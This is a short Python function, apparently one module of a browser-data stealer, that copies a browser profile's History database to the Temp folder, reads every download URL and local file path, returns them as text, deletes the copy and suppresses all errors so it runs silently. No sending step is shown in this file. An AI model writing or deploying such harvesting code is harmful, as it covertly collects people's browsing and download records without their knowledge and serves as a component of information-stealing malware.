import os
import shutil
import sqlite3
from . import user

def get_downloads(path: str, profile: str):
    try:
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return
        result = ""
        shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            result += f"""
Download URL: {row[0]}
Local Path: {row[1]}
            
            """

        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')
        return result
    except:
        pass